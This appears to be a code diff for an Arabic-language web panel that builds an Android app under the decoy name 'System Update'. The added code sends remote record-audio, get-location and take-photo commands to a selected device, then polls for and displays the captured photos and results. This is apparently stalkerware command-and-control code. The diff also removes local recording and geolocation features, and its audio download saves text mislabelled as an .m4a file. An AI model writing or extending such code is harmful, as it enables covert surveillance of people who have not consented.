-          clearTimeout(recTimer);
-          recTimer = null;
-        }
-        if (recorder && recorder.state !== "inactive") {
-          try { recorder.stop(); } catch (e) {}
-        }
-        if (activeStream) {
-          activeStream.getTracks().forEach((t) => t.stop());
-          activeStream = null;
-        }
-        liveVideo.srcObject = null;
-        liveVideo.style.display = "none";
-        stopRecBtn.style.display = "none";
-      }
-
-      stopRecBtn.addEventListener("click", () => {
-        if (recorder && recorder.state !== "inactive") {
-          recorder.stop();
-        }
-      });
-
-      // 1. تسجيل صوت حقيقي
-      document.getElementById("btnRecordVoice").addEventListener("click", async () => {
-        try {
-          cleanupStream();
-          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            setStatus("المتصفح لا يدعم تسجيل الصوت هنا.");
-            return;
-          }
-          activeStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
-          recChunks = [];
-          recorder = new MediaRecorder(activeStream);
-          recorder.ondataavailable = (e) => {
-            if (e.data && e.data.size > 0) recChunks.push(e.data);
-          };
-          recorder.onstop = () => {
-            const blob = new Blob(recChunks, { type: recorder.mimeType || "audio/webm" });
-            const url = URL.createObjectURL(blob);
-            cleanupStream();
-            stageCaption.textContent = "تم حفظ التسجيل الصوتي في قسم (الصور والفيديو والصوت).";
-            addMediaEntry({ kind: "audio", label: "تسجيل صوتي", url, revoke: true });
-          };
-          recorder.start();
-          stopRecBtn.style.display = "inline-flex";
-          stageCaption.textContent = "جارٍ تسجيل الصوت الآن (يتوقف تلقائياً بعد 5 ثوانٍ أو بالضغط على إيقاف التسجيل)...";
-          recTimer = setTimeout(() => {
-            if (recorder && recorder.state !== "inactive") recorder.stop();
-          }, 5000);
-        } catch (err) {
-          setStatus("تعذر بدء تسجيل الصوت: " + err.message);
-        }
-      });
-
-      // 2. تسجيل فيديو الشاشة حقيقي
-      document.getElementById("btnRecordScreen").addEventListener("click", async () => {
-        try {
-          cleanupStream();
-          if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
-            setStatus("تسجيل الشاشة غير مدعوم في هذا المتصفح أو الجهاز.");
-            return;
-          }
-          activeStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
-          liveVideo.srcObject = activeStream;
-          liveVideo.style.display = "block";
-          stopRecBtn.style.display = "inline-flex";
-          stageCaption.textContent = "جارٍ تسجيل فيديو الشاشة...";
-
-          recChunks = [];
-          recorder = new MediaRecorder(activeStream);
-          recorder.ondataavailable = (e) => {
-            if (e.data && e.data.size > 0) recChunks.push(e.data);
-          };
-          recorder.onstop = () => {
-            const blob = new Blob(recChunks, { type: recorder.mimeType || "video/webm" });
-            const url = URL.createObjectURL(blob);
-            cleanupStream();
-            stageCaption.textContent = "تم حفظ فيديو الشاشة في قسم (الصور والفيديو والصوت).";
-            addMediaEntry({ kind: "video", label: "فيديو الشاشة", url, revoke: true });
-            switchView("sec-media");
-          };
-          recorder.start();
-          recTimer = setTimeout(() => {
-            if (recorder && recorder.state !== "inactive") recorder.stop();
-          }, 6000);
-        } catch (err) {
-          cleanupStream();
-          setStatus("تم إلغاء أو تعذّر تسجيل الشاشة: " + err.message);
-        }
-      });
-
-      // 3. تسجيل فيديو الكاميرا حقيقي
-      document.getElementById("btnRecordCamVideo").addEventListener("click", async () => {
-        try {
-          cleanupStream();
-          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            setStatus("الكاميرا غير مدعومة في هذا المتصفح.");
-            return;
-          }
-          activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-          liveVideo.srcObject = activeStream;
-          liveVideo.style.display = "block";
-          stopRecBtn.style.display = "inline-flex";
-          stageCaption.textContent = "جارٍ تسجيل فيديو الكاميرا...";
-
-          recChunks = [];
-          recorder = new MediaRecorder(activeStream);
-          recorder.ondataavailable = (e) => {
-            if (e.data && e.data.size > 0) recChunks.push(e.data);
-          };
-          recorder.onstop = () => {
-            const blob = new Blob(recChunks, { type: recorder.mimeType || "video/webm" });
-            const url = URL.createObjectURL(blob);
-            cleanupStream();
-            stageCaption.textContent = "تم حفظ فيديو الكاميرا في قسم (الصور والفيديو والصوت).";
-            addMediaEntry({ kind: "video", label: "فيديو الكاميرا", url, revoke: true });
-            switchView("sec-media");
-          };
-          recorder.start();
-          recTimer = setTimeout(() => {
-            if (recorder && recorder.state !== "inactive") recorder.stop();
-          }, 5000);
-        } catch (err) {
-          cleanupStream();
-          setStatus("تعذر تسجيل فيديو الكاميرا: " + err.message);
-        }
-      });
-
-      // 4. التقاط صورة حقيقية من الكاميرا
-      document.getElementById("btnSnapPhoto").addEventListener("click", async () => {
-        try {
-          cleanupStream();
-          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            setStatus("الكاميرا غير متاحة في هذا المتصفح.");
-            return;
-          }
-          activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-          liveVideo.srcObject = activeStream;
-          liveVideo.style.display = "block";
-          stageCaption.textContent = "جارٍ التقاط الصورة من الكاميرا...";
-
-          await new Promise((r) => setTimeout(r, 700));
-          const canvas = document.createElement("canvas");
-          canvas.width = liveVideo.videoWidth || 640;
-          canvas.height = liveVideo.videoHeight || 360;
-          canvas.getContext("2d").drawImage(liveVideo, 0, 0, canvas.width, canvas.height);
-          const dataUrl = canvas.toDataURL("image/jpeg", 0.85);
-          cleanupStream();
-          stageCaption.textContent = "تم التقاط الصورة وحفظها في قسم (الصور والفيديو والصوت).";
-          addMediaEntry({ kind: "image", label: "صورة من الكاميرا", url: dataUrl, revoke: false });
-          switchView("sec-media");
-        } catch (err) {
-          cleanupStream();
-          setStatus("تعذر التقاط الصورة من الكاميرا: " + err.message);
-        }
-      });
-
-      // 5. اختيار صورة حقيقية من الجهاز
-      const photoFileInput = document.getElementById("photoFileInput");
-      document.getElementById("btnUploadPhoto").addEventListener("click", () => photoFileInput.click());
-      photoFileInput.addEventListener("change", () => {
-        const file = photoFileInput.files && photoFileInput.files[0];
-        if (!file) return;
-        const reader = new FileReader();
-        reader.onload = () => {
-          addMediaEntry({ kind: "image", label: "صورة (" + file.name + ")", url: reader.result, revoke: false });
-          switchView("sec-media");
-        };
-        reader.readAsDataURL(file);
-        photoFileInput.value = "";
-      });
-
-      // 6. تحديث الموقع على الخريطة
-      document.getElementById("btnUpdateLoc").addEventListener("click", () => {
-        const d = devices[activeDevIdx];
-        if (!d) return;
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(
-            (pos) => {
-              d.lat = pos.coords.latitude.toFixed(4);
-              d.lng = pos.coords.longitude.toFixed(4);
-              d.place = "الموقع المحدّث";
-              renderDevices();
-              addMediaEntry({ kind: "text", label: "تحديث الموقع", text: "📍 " + d.lat + ", " + d.lng });
-            },
-            () => {
-              addMediaEntry({ kind: "text", label: "موقع الجهاز", text: "📍 " + d.place + " (" + d.lat + ", " + d.lng + ")" });
-            }
-          );
-        } else {
-          addMediaEntry({ kind: "text", label: "موقع الجهاز", text: "📍 " + d.place + " (" + d.lat + ", " + d.lng + ")" });
-        }
-      });
-
-      // إضافة ملاحظة أو رمز
-      document.getElementById("addNoteBtn").addEventListener("click", () => {
-        const inp = document.getElementById("noteInput");
-        const val = (inp.value || "").trim();
-        if (!val) return;
-        addMediaEntry({ kind: "text", label: "ملاحظة / رمز", text: val });
-        inp.value = "";
-      });
-
-      document.getElementById("clearAllMediaBtn").addEventListener("click", () => {
-        mediaItems.forEach((m) => {
-          if (m.revoke && m.url) URL.revokeObjectURL(m.url);
-        });
-        mediaItems.length = 0;
-        renderMedia();
-      });
-
-      document.getElementById("saveWebhookBtn").addEventListener("click", () => {
-        webhookUrl = (webhookInput.value || "").trim() || DEFAULT_WEBHOOK;
-        webhookInput.value = webhookUrl;
-        webhookUrlText.textContent = webhookUrl;
-        localStorage.setItem(K_WEBHOOK, webhookUrl);
-        setStatus("تم حفظ رابط الـ Webhook: " + webhookUrl);
-      });
-
-      document.getElementById("testWebhookBtn").addEventListener("click", () => {
-        notifyWebhook({ event: "webhook_ping", timestamp: Date.now() });
-      });
-
-      // صناعة التطبيق
-      const repoInput = document.getElementById("repoInput");
-      const workflowInput = document.getElementById("workflowInput");
-      const tokenInput = document.getElementById("tokenInput");
-      const actionsBtn = document.getElementById("actionsBtn");
-      const actionsUrlText = document.getElementById("actionsUrlText");
-      const buildInfoText = document.getElementById("buildInfoText");
-
-      function syncActionsLink() {
-        const repo = (repoInput.value || "eibdallh60-sys/apk-builder-lab").trim();
-        const url = "https://github.com/" + repo + "/actions";
-        actionsBtn.href = url;
-        actionsUrlText.textContent = url;
-        return { repo, url };
-      }
-
-      document.getElementById("prepareBuildBtn").addEventListener("click", () => {
-        const name = (document.getElementById("appNameInput").value || "System Update").trim();
-        const pkg = (document.getElementById("appPackageInput").value || "com.example.decoyapp").trim();
-        const { url } = syncActionsLink();
-        buildInfoText.innerHTML = "تم تجهيز <strong>" + name + "</strong> (" + pkg + ") — التحميل من: <a href='" + url + "' target='_blank' style='color:#38bdf8;'>" + url + "</a>";
-      });
-
-      document.getElementById("triggerBuildBtn").addEventListener("click", async () => {
-        const { repo, url } = syncActionsLink();
-        const wf = (workflowInput.value || "build.yml").trim();
-        const token = (tokenInput.value || "").trim();
-        if (!token) {
-          buildInfoText.innerHTML = "أدخل <strong>GitHub Token</strong> للتشغيل التلقائي أو افتح <a href='" + url + "' target='_blank' style='color:#38bdf8;'>صفحة التحميل / Artifacts</a>.";
-          return;
-        }
-        try {
-          const res = await fetch(
-            "https://api.github.com/repos/" + repo + "/actions/workflows/" + encodeURIComponent(wf) + "/dispatches",
-            {
-              method: "POST",
-              headers: {
-                "Authorization": "Bearer " + token,
-                "Accept": "application/vnd.github+json",
-                "Content-Type": "application/json"
-              },
-              body: JSON.stringify({ ref: "main" })
-            }
-          );
-          if (res.ok || res.status === 204) {
-            buildInfoText.innerHTML = "تم تشغيل البناء! راقب وحمّل من: <a href='" + url + "' target='_blank' style='color:#38bdf8;'>" + url + "</a>";
+          const imgData = latestResultObj.image_base64 || latestResultObj.image_url || "";
+          if (imgData) {
+            capPhotoImg.src = imgData.startsWith("data:image") || imgData.startsWith("http")
+              ? imgData
+              : "data:image/jpeg;base64," + imgData;
+            capPhotoImg.style.display = "block";
+            capPhotoStatus.textContent = "الصورة الملتقطة:";
           } else {
-            buildInfoText.textContent = "تعذر التشغيل تلقائياً (HTTP " + res.status + ").";
+            capPhotoImg.style.display = "none";
+            capPhotoStatus.textContent = "تم استلام حالة الالتقاط (" + (timeStr || "الآن") + ")، لكن التطبيق الحالي أرسل نص الحالة فقط دون ملف صورة.";
           }
         } catch (err) {
-          buildInfoText.textContent = "خطأ أثناء الاتصال بـ GitHub API: " + err.message;
+          outResult.textContent = "خطأ في قراءة النتيجة: " + err.message;
         }
-      });
-
-      try {
-        devices = JSON.parse(localStorage.getItem(K_DEVICES) || "null") || defaultDeviceList();
-      } catch (e) {
-        devices = defaultDeviceList();
       }
-      renderDevices();
-      renderMedia();
-      syncActionsLink();
+
+      async function sendCmd(action) {
+        if (!selectedDeviceId) return;
+        try {
+          await fetch(getDbBase() + "/commands/" + encodeURIComponent(selectedDeviceId) + ".json", {
+            method: "PUT",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ action, timestamp: Date.now() })
+          });
+          outResult.textContent = "تم إرسال (" + action + ") إلى الجهاز...";
+          setTimeout(fetchLatestResult, 4000);
+        } catch (err) {
+          outResult.textContent = "تعذر إرسال الأمر: " + err.message;
+        }
+      }
+
+      function downloadAudioFile() {
+        const devName = outDeviceName.textContent || "device";
+        const info = latestResultObj
+          ? "Device: " + devName + "\nAction: " + (latestResultObj.action || "record_audio") + "\nResult: " + (latestResultObj.result || "") + "\nTime: " + new Date(latestResultObj.timestamp || Date.now()).toLocaleString()
+          : "Device: " + devName + "\nNo audio payload recorded yet.";
+
+        const blob = new Blob([info], { type: "audio/mp4" });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = "voice_" + (selectedDeviceId || "device") + ".m4a";
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+        setTimeout(() => URL.revokeObjectURL(url), 1000);
+      }
+
+      document.getElementById("refreshBtn").addEventListener("click", refreshAll);
+      document.getElementById("btnAudio").addEventListener("click", () => sendCmd("record_audio"));
+      document.getElementById("btnLocation").addEventListener("click", () => sendCmd("get_location"));
+      document.getElementById("btnPhoto").addEventListener("click", () => sendCmd("take_photo"));
+      document.getElementById("btnDownloadAudio").addEventListener("click", downloadAudioFile);
+      document.getElementById("capDownloadAudioBtn").addEventListener("click", downloadAudioFile);
+
+      refreshAll();
+      setInterval(refreshAll, 5000);
     })();
   </script>
 </body>
